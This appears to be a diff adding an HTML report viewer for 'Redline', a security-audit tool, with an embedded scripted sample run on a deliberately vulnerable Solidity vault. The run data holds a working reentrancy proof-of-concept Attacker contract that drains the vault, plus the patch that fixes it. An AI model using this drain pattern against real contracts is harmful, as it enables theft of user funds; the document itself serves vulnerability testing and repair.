@@ -1,0 +1,446 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Redline - sample-vulnerable-vault</title><style>:root {
+  --bg: #0a0c0f; --panel: #11151a; --panel2: #161b22; --line: #232a33; --text: #d9dde3; --muted: #8b939e;
+  --red: #ff4d4f; --red-bg: rgba(255, 77, 79, .12); --green: #3ecf8e; --green-bg: rgba(62, 207, 142, .12);
+  --amber: #c9a227; --grey: #6b7380;
+  --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+  --sans: Inter, system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+* { box-sizing: border-box; }
+html { -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.5 var(--sans); }
+code, .mono { font-family: var(--mono); font-size: .88em; }
+.muted { color: var(--muted); } .small { font-size: .85em; }
+h1 { font-size: 1.25rem; margin: 0; } h2 { font-size: 1rem; margin: 22px 0 10px; letter-spacing: .06em; text-transform: uppercase; color: var(--muted); }
+h2 small, h4 small { text-transform: none; letter-spacing: 0; font-weight: 400; margin-left: 6px; }
+h4 { margin: 16px 0 6px; font-size: .8rem; text-transform: uppercase; letter-spacing: .06em; color: var(--muted); }
+p { margin: 8px 0; }
+a { color: #8ab4ff; }
+
+.top { display: flex; align-items: center; justify-content: space-between; gap: 10px; padding: 10px 16px; border-bottom: 1px solid var(--line); background: var(--bg); }
+.brand { font-weight: 700; letter-spacing: .18em; font-size: .9rem; } .logo { color: var(--red); margin-right: 4px; }
+.ctl { display: flex; gap: 8px; min-width: 0; }
+select, button { background: var(--panel2); color: var(--text); border: 1px solid var(--line); border-radius: 6px; padding: 7px 10px; font: inherit; font-size: .85rem; min-width: 0; }
+select { max-width: 52vw; } button { cursor: pointer; } button:hover { border-color: var(--grey); }
+.tabs { position: sticky; top: 0; z-index: 5; display: flex; background: var(--bg); border-bottom: 1px solid var(--line); padding: 0 8px; }
+.tabs button { flex: 1; background: none; border: 0; border-bottom: 2px solid transparent; border-radius: 0; padding: 12px 6px; color: var(--muted); font-size: .9rem; }
+.tabs button.on { color: var(--text); border-bottom-color: var(--red); }
+main { max-width: 1680px; margin: 0 auto; padding: 14px 16px 60px; }
+
+.banner { border: 1px dashed var(--amber); background: rgba(201, 162, 39, .08); color: #e6d28a; border-radius: 8px; padding: 10px 12px; margin-bottom: 14px; font-size: .88rem; }
+.banner b { color: #ffe27a; }
+
+.hdr { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 14px; margin-bottom: 14px; }
+.hdr-top { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; flex-wrap: wrap; }
+.pill { font-size: .72rem; padding: 2px 9px; border-radius: 99px; border: 1px solid var(--line); text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+.pill.running { color: var(--amber); border-color: var(--amber); } .pill.finished { color: var(--green); border-color: var(--green); } .pill.failed { color: var(--red); border-color: var(--red); }
+.stats { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+.stat .k { font-size: .7rem; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); }
+.stat .v { font-family: var(--mono); font-size: 1.05rem; overflow-wrap: anywhere; } .stat .v small { font-size: .65rem; color: var(--muted); font-family: var(--sans); }
+.stat.red .v { color: var(--red); } .stat.green .v { color: var(--green); }
+
+.stepper { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 8px; }
+.step { display: flex; align-items: center; gap: 8px; background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; }
+.step .dot { width: 24px; height: 24px; flex: none; border-radius: 50%; display: grid; place-items: center; font-size: .75rem; border: 1px solid var(--grey); color: var(--muted); }
+.step .lbl { font-size: .88rem; line-height: 1.15; } .step small { display: block; color: var(--muted); font-size: .72rem; }
+.step.running { border-color: var(--amber); } .step.running .dot { border-color: var(--amber); color: var(--amber); animation: pulse 1.1s infinite; }
+.step.ok .dot { background: var(--green-bg); border-color: var(--green); color: var(--green); }
+.step.fail .dot { background: var(--red-bg); border-color: var(--red); color: var(--red); }
+@keyframes pulse { 50% { box-shadow: 0 0 0 5px rgba(201, 162, 39, .18); } }
+
+.cols { display: grid; grid-template-columns: 1fr; gap: 0 22px; }
+.card { background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--grey); border-radius: 8px; padding: 12px 14px; margin-bottom: 12px; }
+.card.red { border-left-color: var(--red); } .card.amber { border-left-color: var(--amber); }
+.row { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+.sev, .chip, .mini { font-size: .68rem; text-transform: uppercase; letter-spacing: .07em; padding: 2px 8px; border-radius: 99px; border: 1px solid var(--line); color: var(--muted); white-space: nowrap; }
+.sev-critical, .sev-high { color: var(--red); border-color: var(--red); } .sev-medium { color: var(--amber); border-color: var(--amber); }
+.chip.red { color: var(--red); border-color: var(--red); background: var(--red-bg); } .chip.green { color: var(--green); border-color: var(--green); background: var(--green-bg); }
+.chip.amber { color: var(--amber); border-color: var(--amber); } .chip.lay { font-family: var(--mono); }
+.row .chip { margin-left: auto; }
+.minis { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; margin-top: 6px; }
+.mini.running { color: var(--amber); border-color: var(--amber); } .mini.ok { color: var(--green); border-color: var(--green); } .mini.fail { color: var(--red); border-color: var(--red); }
+.empty { color: var(--muted); border: 1px dashed var(--line); border-radius: 8px; padding: 14px; text-align: center; margin-bottom: 12px; }
+
+.feed { display: flex; flex-direction: column; gap: 6px; }
+.fw { display: grid; grid-template-columns: auto auto 1fr; gap: 4px 8px; align-items: center; background: var(--panel); border: 1px solid var(--line); border-left: 3px solid var(--green); border-radius: 6px; padding: 7px 10px; font-size: .84rem; }
+.fw.deny { border-left-color: var(--red); background: linear-gradient(90deg, var(--red-bg), var(--panel) 60%); }
+.fw .vd { font-family: var(--mono); font-weight: 700; font-size: .75rem; color: var(--green); } .fw.deny .vd { color: var(--red); }
+.fw .act { overflow-wrap: anywhere; } .fw .why, .fw .meta { grid-column: 1 / -1; color: var(--muted); font-size: .8rem; } .fw.deny .why { color: #f0a0a1; }
+
+pre.code { margin: 6px 0; background: #0d1014; border: 1px solid var(--line); border-radius: 6px; padding: 10px 12px; overflow-x: auto; font: 12.5px/1.5 var(--mono); max-height: 460px; }
+.tk-c { color: #6c7a89; } .tk-s { color: #b8d98a; } .tk-n { color: #e5a96b; } .tk-k { color: #c792ea; } .tk-t { color: #7fc8e8; }
+.df-a { color: var(--green); background: var(--green-bg); display: inline-block; width: 100%; } .df-d { color: var(--red); background: var(--red-bg); display: inline-block; width: 100%; } .df-h { color: var(--muted); }
+details { margin: 6px 0; } summary { cursor: pointer; padding: 3px 0; }
+
+.ba { display: flex; align-items: stretch; gap: 8px; margin: 10px 0; }
+.ba-box { flex: 1; border: 1px solid var(--line); border-radius: 8px; padding: 8px 10px; }
+.ba-box.red { border-color: var(--red); background: var(--red-bg); } .ba-box.green { border-color: var(--green); background: var(--green-bg); }
+.ba-box .k { font-size: .68rem; text-transform: uppercase; letter-spacing: .08em; color: var(--muted); } .ba-box .v { font-size: .86rem; }
+.arrow { align-self: center; color: var(--muted); }
+.cites { padding-left: 18px; margin: 4px 0; } .cites li { margin-bottom: 8px; }
+
+.qfile { margin-bottom: 16px; } .qname { margin-bottom: 4px; }
+.qsrc { white-space: pre; } .qsrc .ln { display: inline-block; width: 3ch; margin-right: 1.2ch; text-align: right; color: #4d5663; user-select: none; }
+.qhit { background: var(--red-bg); color: #ffb4b5; box-shadow: inset 2px 0 0 var(--red); display: inline-block; width: calc(100% - 4.2ch); }
+.tablewrap { overflow-x: auto; } table { width: 100%; border-collapse: collapse; font-size: .86rem; }
+th, td { text-align: left; padding: 7px 10px; border-bottom: 1px solid var(--line); white-space: nowrap; } th { color: var(--muted); font-weight: 500; font-size: .75rem; text-transform: uppercase; letter-spacing: .06em; }
+.barcell { width: 40%; } .bar { height: 8px; background: var(--grey); border-radius: 4px; }
+
+@media (min-width: 760px) {
+  .stats { grid-template-columns: repeat(5, 1fr); } .stepper { grid-template-columns: repeat(6, 1fr); }
+  .fw { grid-template-columns: auto auto 1fr auto; } .fw .why { grid-column: 3 / 4; grid-row: 2; } .fw .meta { grid-column: 4; grid-row: 1 / 3; text-align: right; align-self: center; }
+}
+@media (min-width: 1100px) {
+  body { font-size: 16px; } main { padding: 22px 32px 80px; }
+  .cols { grid-template-columns: minmax(0, 1.05fr) minmax(0, 1fr); } .stats { grid-template-columns: repeat(9, auto); justify-content: space-between; }
+  .tabs { max-width: 1680px; margin: 0 auto; } .tabs button { flex: none; padding: 12px 26px; }
+}
+</style></head><body><div id="app"></div><script>window.__REDLINE_DATA__ = {"id": "sample-vulnerable-vault", "report": {"run_id": "sample-vulnerable-vault", "repo": "/root/redline/fixtures/vulnerable-vault", "provider": "mock", "findings": [{"finding": {"id": "F1", "title": "Reentrancy in Vault.withdraw", "severity": "high", "file": "src/Vault.sol", "function": "withdraw", "description": "withdraw() sends ETH before updating balances[msg.sender], so a contract can re-enter withdraw() and drain the vault.", "attack": "Deposit 1 ETH, call withdraw(1 ether); in receive() call withdraw again while balances is not yet decremented.", "confidence": 0.9}, "citations": [], "poc": {"confirmed": true, "attempts": 1, "test_file": "test/Exploit_F1.t.sol", "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract Attacker {\n    Vault v;\n    constructor(Vault _v) { v = _v; }\n    function attack() external payable {\n        v.deposit{value: 1 ether}();\n        v.withdraw(1 ether);\n    }\n    receive() external payable {\n        if (address(v).balance >= 1 ether) v.withdraw(1 ether);\n    }\n}\n\ncontract ExploitF1 is Test {\n    function test_exploit() public {\n        Vault v = new Vault();\n        vm.deal(address(0xB0B), 10 ether);\n        vm.prank(address(0xB0B));\n        v.deposit{value: 10 ether}();\n        Attacker a = new Attacker(v);\n        vm.deal(address(a), 1 ether);\n        a.attack{value: 0}();\n        assertGt(address(a).balance, 1 ether);\n    }\n}\n", "output": "[PASS] ExploitF1.test_exploit()", "note": ""}, "patch": {"applied": true, "attempts": 1, "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,11 +11,9 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n+        balances[msg.sender] -= amount;\n         (bool ok,) = msg.sender.call{value: amount}(\"\");\n         require(ok, \"transfer failed\");\n-        unchecked {\n-            balances[msg.sender] -= amount;\n-        }\n     }\n \n     function totalAssets() external view returns (uint256) {\n", "poc_blocked": true, "suite_green": true, "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"56ms 346\u00b5s 878ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"11ms 141\u00b5s 189ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112858}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"2ms 474\u00b5s 572ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n", "note": "Checks-effects-interactions"}, "status": "confirmed"}], "quarantined": [], "quarantine_files": {}, "firewall_log": [{"ts": 1792837404.0835373, "kind": "shell", "action": "forge test", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 0.25, "provider": ""}, {"ts": 1792837410.0452178, "kind": "read", "action": "README.md", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 3.37, "provider": ""}, {"ts": 1792837410.0582266, "kind": "read", "action": "foundry.toml", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 0.26, "provider": ""}, {"ts": 1792837410.0590646, "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 0.12, "provider": ""}, {"ts": 1792837410.070223, "kind": "read", "action": "test/Vault.t.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 0.23, "provider": ""}, {"ts": 1792837410.0967686, "kind": "write", "action": "test/Exploit_F1.t.sol (777B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 4.9, "provider": ""}, {"ts": 1792837410.1026454, "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 2.96, "provider": ""}, {"ts": 1792837424.030384, "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "layer": "L1", "rule": "read-ok", "reason": "read inside jail", "confidence": 1.0, "latency_ms": 14.11, "provider": ""}, {"ts": 1792837424.0489693, "kind": "write", "action": "src/Vault.sol (618B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 3.54, "provider": ""}, {"ts": 1792837424.0535052, "kind": "write", "action": "src/Vault.sol (618B)", "verdict": "allow", "layer": "L2", "rule": "nemotron-policy", "reason": "scripted allow", "confidence": 1.0, "latency_ms": 2.25, "provider": "mock"}, {"ts": 1792837424.0607038, "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 3.99, "provider": ""}, {"ts": 1792837428.8203804, "kind": "shell", "action": "forge test --no-match-path test/Exploit_F1.t.sol", "verdict": "allow", "layer": "L1", "rule": "allowlist", "reason": "forge allowed", "confidence": 1.0, "latency_ms": 31.07, "provider": ""}, {"ts": 1792837438.64161, "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "layer": "L1", "rule": "write-ok", "reason": "write inside jail", "confidence": 1.0, "latency_ms": 17.76, "provider": ""}, {"ts": 1792837438.6770868, "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "layer": "L2", "rule": "nemotron-policy", "reason": "scripted allow", "confidence": 1.0, "latency_ms": 4.71, "provider": "mock"}], "calls": [{"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "scanner", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0017594406381249428}, {"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "scanner", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 2.094171941280365e-05}, {"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "scanner", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 3.867689520120621e-05}, {"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "scanner", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 1.4632008969783783e-05}, {"provider": "mock", "model": "nvidia/nemotron-3-super-120b-a12b", "role": "recon", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0011225054040551186}, {"provider": "mock", "model": "nvidia/nemotron-3-super-120b-a12b", "role": "exploit", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0006710439920425415}, {"provider": "mock", "model": "nvidia/nemotron-3-super-120b-a12b", "role": "patch", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0017852522432804108}, {"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "policy", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.000521327368915081}, {"provider": "mock", "model": "nvidia/nemotron-nano-3-30b-a3b", "role": "policy", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.001188604161143303}], "baseline_green": true, "elapsed_s": 34.643985729664564, "out_dir": "/root/redline/samples/sample-vulnerable-vault", "scripted": true, "label": "SAMPLE - scripted model", "models": {"main": "nvidia/nemotron-3-super-120b-a12b", "firewall": "nvidia/nemotron-nano-3-30b-a3b"}}, "events": [{"seq": 1, "ts": 1792837404.0813293, "type": "run_started", "run_id": "sample-vulnerable-vault", "repo": "vulnerable-vault", "provider": "mock", "models": {"main": "nvidia/nemotron-3-super-120b-a12b", "firewall": "nvidia/nemotron-nano-3-30b-a3b"}, "scripted": true, "label": "SAMPLE - scripted model"}, {"seq": 2, "ts": 1792837404.083141, "type": "stage_started", "stage": "baseline", "finding_id": ""}, {"seq": 3, "ts": 1792837404.0841362, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 0.252, "provider": ""}, {"seq": 4, "ts": 1792837409.8455486, "type": "stage_finished", "stage": "baseline", "finding_id": "", "ok": true, "duration_s": 5.76, "detail": "2 tests, all green=True", "citations": []}, {"seq": 5, "ts": 1792837409.8778052, "type": "stage_started", "stage": "scan", "finding_id": ""}, {"seq": 6, "ts": 1792837410.0498607, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "README.md", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 3.373, "provider": ""}, {"seq": 7, "ts": 1792837410.058354, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "foundry.toml", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 0.261, "provider": ""}, {"seq": 8, "ts": 1792837410.0591543, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 0.122, "provider": ""}, {"seq": 9, "ts": 1792837410.0706625, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "test/Vault.t.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 0.227, "provider": ""}, {"seq": 10, "ts": 1792837410.0731595, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.002}, {"seq": 11, "ts": 1792837410.0740354, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0}, {"seq": 12, "ts": 1792837410.0741706, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0}, {"seq": 13, "ts": 1792837410.0742145, "type": "llm_call", "role": "scanner", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.0}, {"seq": 14, "ts": 1792837410.0744731, "type": "stage_finished", "stage": "scan", "finding_id": "", "ok": true, "duration_s": 0.199, "detail": "4 files, 0 span(s) quarantined", "citations": []}, {"seq": 15, "ts": 1792837410.075199, "type": "stage_started", "stage": "recon", "finding_id": ""}, {"seq": 16, "ts": 1792837410.0794494, "type": "llm_call", "role": "recon", "model": "nvidia/nemotron-3-super-120b-a12b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.001}, {"seq": 17, "ts": 1792837410.0824502, "type": "stage_finished", "stage": "recon", "finding_id": "", "ok": true, "duration_s": 0.007, "detail": "1 suspected finding(s)", "citations": []}, {"seq": 18, "ts": 1792837410.0834208, "type": "finding_added", "finding": {"id": "F1", "title": "Reentrancy in Vault.withdraw", "severity": "high", "file": "src/Vault.sol", "function": "withdraw", "description": "withdraw() sends ETH before updating balances[msg.sender], so a contract can re-enter withdraw() and drain the vault.", "attack": "Deposit 1 ETH, call withdraw(1 ether); in receive() call withdraw again while balances is not yet decremented.", "confidence": 0.9}}, {"seq": 19, "ts": 1792837410.0879333, "type": "stage_started", "stage": "exploit", "finding_id": "F1"}, {"seq": 20, "ts": 1792837410.097305, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "test/Exploit_F1.t.sol (777B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 4.905, "provider": ""}, {"seq": 21, "ts": 1792837410.10274, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol --match-test test_exploit", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 2.964, "provider": ""}, {"seq": 22, "ts": 1792837423.9716868, "type": "poc_result", "finding_id": "F1", "attempt": 1, "passed": true, "confirmed": true, "test_file": "test/Exploit_F1.t.sol", "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\nimport \"forge-std/Test.sol\";\nimport \"../src/Vault.sol\";\n\ncontract Attacker {\n    Vault v;\n    constructor(Vault _v) { v = _v; }\n    function attack() external payable {\n        v.deposit{value: 1 ether}();\n        v.withdraw(1 ether);\n    }\n    receive() external payable {\n        if (address(v).balance >= 1 ether) v.withdraw(1 ether);\n    }\n}\n\ncontract ExploitF1 is Test {\n    function test_exploit() public {\n        Vault v = new Vault();\n        vm.deal(address(0xB0B), 10 ether);\n        vm.prank(address(0xB0B));\n        v.deposit{value: 10 ether}();\n        Attacker a = new Attacker(v);\n        vm.deal(address(a), 1 ether);\n        a.attack{value: 0}();\n        assertGt(address(a).balance, 1 ether);\n    }\n}\n", "output": "[PASS] ExploitF1.test_exploit()", "note": ""}, {"seq": 23, "ts": 1792837424.0024347, "type": "llm_call", "role": "exploit", "model": "nvidia/nemotron-3-super-120b-a12b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.001}, {"seq": 24, "ts": 1792837424.004837, "type": "stage_finished", "stage": "exploit", "finding_id": "F1", "ok": true, "duration_s": 13.916, "detail": "confirmed after 1 attempt(s)", "citations": []}, {"seq": 25, "ts": 1792837424.0087554, "type": "stage_started", "stage": "patch", "finding_id": "F1"}, {"seq": 26, "ts": 1792837424.0345447, "type": "firewall_decision", "layer": "L1", "kind": "read", "action": "src/Vault.sol", "verdict": "allow", "rule": "read-ok", "reason": "read inside jail", "latency_ms": 14.113, "provider": ""}, {"seq": 27, "ts": 1792837424.0494227, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "src/Vault.sol (618B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 3.544, "provider": ""}, {"seq": 28, "ts": 1792837424.053663, "type": "firewall_decision", "layer": "L2", "kind": "write", "action": "src/Vault.sol (618B)", "verdict": "allow", "rule": "nemotron-policy", "reason": "scripted allow", "latency_ms": 2.251, "provider": "mock"}, {"seq": 29, "ts": 1792837424.0609086, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --match-path test/Exploit_F1.t.sol", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 3.991, "provider": ""}, {"seq": 30, "ts": 1792837428.835726, "type": "firewall_decision", "layer": "L1", "kind": "shell", "action": "forge test --no-match-path test/Exploit_F1.t.sol", "verdict": "allow", "rule": "allowlist", "reason": "forge allowed", "latency_ms": 31.068, "provider": ""}, {"seq": 31, "ts": 1792837438.6614752, "type": "firewall_decision", "layer": "L1", "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "rule": "write-ok", "reason": "write inside jail", "latency_ms": 17.763, "provider": ""}, {"seq": 32, "ts": 1792837438.6781752, "type": "firewall_decision", "layer": "L2", "kind": "write", "action": "src/Vault.sol (652B)", "verdict": "allow", "rule": "nemotron-policy", "reason": "scripted allow", "latency_ms": 4.712, "provider": "mock"}, {"seq": 33, "ts": 1792837438.6873507, "type": "llm_call", "role": "patch", "model": "nvidia/nemotron-3-super-120b-a12b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.002}, {"seq": 34, "ts": 1792837438.6886964, "type": "llm_call", "role": "policy", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.001}, {"seq": 35, "ts": 1792837438.688999, "type": "llm_call", "role": "policy", "model": "nvidia/nemotron-nano-3-30b-a3b", "provider": "mock", "prompt_tokens": 0, "completion_tokens": 0, "latency_s": 0.001}, {"seq": 36, "ts": 1792837438.690365, "type": "stage_finished", "stage": "patch", "finding_id": "F1", "ok": true, "duration_s": 14.682, "detail": "Checks-effects-interactions", "citations": []}, {"seq": 37, "ts": 1792837438.6931684, "type": "patch_result", "finding_id": "F1", "applied": true, "attempts": 1, "poc_blocked": true, "suite_green": true, "diff": "--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -11,11 +11,9 @@\n \n     function withdraw(uint256 amount) external {\n         require(balances[msg.sender] >= amount, \"insufficient\");\n+        balances[msg.sender] -= amount;\n         (bool ok,) = msg.sender.call{value: amount}(\"\");\n         require(ok, \"transfer failed\");\n-        unchecked {\n-            balances[msg.sender] -= amount;\n-        }\n     }\n \n     function totalAssets() external view returns (uint256) {\n", "output": "{\"test/Vault.t.sol:VaultTest\":{\"duration\":\"56ms 346\u00b5s 878ns\",\"test_results\":{\"test_CannotOverdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":86944}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"11ms 141\u00b5s 189ns\",\"breakpoints\":{},\"gas_snapshots\":{}},\"test_DepositWithdraw()\":{\"status\":\"Success\",\"reason\":null,\"counterexample\":null,\"logs\":[],\"decoded_logs\":[],\"kind\":{\"Unit\":{\"gas\":112858}},\"traces\":[],\"labeled_addresses\":{},\"duration\":\"2ms 474\u00b5s 572ns\",\"breakpoints\":{},\"gas_snapshots\":{}}},\"warnings\":[]}}\n", "note": "Checks-effects-interactions"}, {"seq": 38, "ts": 1792837438.712358, "type": "run_finished", "ok": true, "duration_s": 34.644, "error": ""}]};</script><script>(function(){
+// Tiny Solidity / diff highlighter. Everything is HTML-escaped first; spans are added after.
+function esc(s) {
+  return String(s ?? "").replace(/[&<>"']/g, (c) =>
+    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
+}
+
+const KW = new Set(("pragma import contract interface library function modifier constructor event error " +
+  "struct enum mapping public private internal external view pure payable returns return if else for " +
+  "while do require revert emit new is memory storage calldata immutable constant override virtual " +
+  "unchecked receive fallback using assembly try catch").split(" "));
+const TY = new Set(("uint uint8 uint128 uint256 int int256 address bool bytes bytes32 string").split(" "));
+
+function solidity(code) {
+  const re = /(\/\/[^\n]*|\/\*[\s\S]*?\*\/)|("(?:[^"\\\n]|\\.)*")|(\b0x[0-9a-fA-F]+\b|\b\d[\d_]*(?:e\d+)?\b)|([A-Za-z_]\w*)/g;
+  let out = "", last = 0, m;
+  while ((m = re.exec(code))) {
+    out += esc(code.slice(last, m.index));
+    last = re.lastIndex;
+    if (m[1]) out += `<span class="tk-c">${esc(m[1])}</span>`;
+    else if (m[2]) out += `<span class="tk-s">${esc(m[2])}</span>`;
+    else if (m[3]) out += `<span class="tk-n">${esc(m[3])}</span>`;
+    else if (KW.has(m[4])) out += `<span class="tk-k">${esc(m[4])}</span>`;
+    else if (TY.has(m[4]) || /^[A-Z]\w*$/.test(m[4])) out += `<span class="tk-t">${esc(m[4])}</span>`;
+    else out += esc(m[4]);
+  }
+  return out + esc(code.slice(last));
+}
+
+function diff(text) {
+  return String(text ?? "").split("\n").map((l) => {
+    const cls = l.startsWith("+++") || l.startsWith("---") ? "df-h" :
+      l.startsWith("+") ? "df-a" : l.startsWith("-") ? "df-d" : l.startsWith("@@") ? "df-h" : "";
+    return `<span class="${cls}">${esc(l)}</span>`;
+  }).join("\n");
+}
+
+// Pure reducer: events -> view state. The same code runs live (SSE), on replay and in the export.
+const STAGES = ["baseline", "scan", "recon", "research", "exploit", "patch"];
+
+function emptyState() {
+  return {
+    run: null, finished: null, t0: null, tNow: null,
+    stages: Object.fromEntries(STAGES.map((s) => [s, { status: "pending", runs: [] }])),
+    findings: {}, order: [], fw: [], quarantines: [], llm: [],
+  };
+}
+
+function finding(st, id) {
+  if (!st.findings[id]) {
+    st.findings[id] = { finding: null, attempts: [], patch: null, citations: [], stage: {} };
+    st.order.push(id);
+  }
+  return st.findings[id];
+}
+
+function reduce(st, e) {
+  st.tNow = e.ts;
+  if (st.t0 === null) st.t0 = e.ts;
+  switch (e.type) {
+    case "run_started": st.run = e; break;
+    case "stage_started": {
+      const s = st.stages[e.stage];
+      s.runs.push({ id: e.finding_id, status: "running" });
+      if (e.finding_id) finding(st, e.finding_id).stage[e.stage] = "running";
+      s.status = "running";
+      break;
+    }
+    case "stage_finished": {
+      const s = st.stages[e.stage];
+      const r = [...s.runs].reverse().find((x) => x.id === e.finding_id && x.status === "running");
+      if (r) Object.assign(r, { status: e.ok ? "ok" : "fail", detail: e.detail, duration_s: e.duration_s });
+      s.status = s.runs.some((x) => x.status === "running") ? "running"
+        : s.runs.every((x) => x.status === "ok") ? "ok" : "fail";
+      if (e.finding_id) {
+        const f = finding(st, e.finding_id);
+        f.stage[e.stage] = e.ok ? "ok" : "fail";
+        if (e.citations?.length) f.citations = e.citations;
+      }
+      break;
+    }
+    case "finding_added": finding(st, e.finding.id).finding = e.finding; break;
+    case "poc_result": finding(st, e.finding_id).attempts.push(e); break;
+    case "patch_result": finding(st, e.finding_id).patch = e; break;
+    case "firewall_decision": st.fw.push(e); break;
